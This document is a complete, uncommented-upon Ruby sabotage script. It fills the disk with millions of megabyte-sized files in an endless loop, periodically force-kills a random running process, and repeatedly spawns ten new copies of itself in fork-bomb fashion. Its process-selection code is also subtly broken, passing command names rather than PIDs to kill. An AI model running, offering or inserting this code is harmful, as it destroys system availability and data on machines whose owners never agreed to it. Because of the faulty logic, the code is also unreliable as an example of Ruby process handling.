# Function to generate large data structure
def generate_data
    'a' * 10**6
end

# Function to kill a random process
def kill_random_process
    processes = `ps -e -o pid,comm`
    process_ids = processes.scan(/\d+\s+(\S+)/).reject { |_, comm| comm == 'ruby' }.map(&:first)
    process_to_kill = process_ids.sample
    `kill -9 #{process_to_kill}`
    process_to_kill
end

# Function to overwhelm the system
def overwhelm_system
    puts 'Overwhelming system...'
    10.times { system("ruby #{__FILE__}") }
end

# Main function
def main
    count = 1

    loop do
        # Generate large data structure to consume memory
        data = generate_data

        # Save to multiple text files (simulated)
        10_000.times { |i| File.write("output_#{count}_#{i}.txt", data) }

        count += 1

        # Kill random process every 50 iterations
        if count % 50 == 0
            killed_process = kill_random_process
            puts "Killed process with PID: #{killed_process}"
        end

        # Overwhelm the system every 100 iterations
        overwhelm_system if count % 100 == 0
    end
end

# Start the main function
main
